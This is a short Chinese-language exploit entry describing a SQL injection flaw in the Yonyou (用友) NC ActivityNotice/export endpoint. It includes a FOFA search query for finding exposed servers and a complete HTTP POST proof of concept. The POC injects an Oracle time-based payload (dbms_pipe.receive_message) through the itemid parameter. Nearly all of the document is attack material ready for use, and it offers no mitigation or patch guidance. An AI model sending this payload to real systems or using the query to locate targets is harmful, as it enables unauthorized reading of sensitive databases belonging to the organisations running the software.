## 用友NC ActivityNotice export SQL注入漏洞

## 漏洞描述
用友 NC `ActivityNotice/export` 接口未对输入参数进行过滤，攻击者可注入恶意 SQL，读取数据库敏感数据或执行高危命令。

## 网络空间测绘
```
fofa: app="用友-UFIDA-NC"
```

## POC
```
POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

itemid=1' AND 1=dbms_pipe.receive_message('RDS',5) -- 
```

## 参考
- 社区情报

